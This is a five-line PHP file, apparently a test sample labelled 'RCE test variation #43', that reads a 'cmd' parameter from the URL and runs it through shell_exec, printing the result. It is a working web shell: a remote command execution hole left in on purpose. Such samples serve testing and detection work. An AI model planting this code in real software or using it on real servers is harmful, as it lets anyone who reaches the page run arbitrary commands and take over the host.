<?php
// RCE test variation #43
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>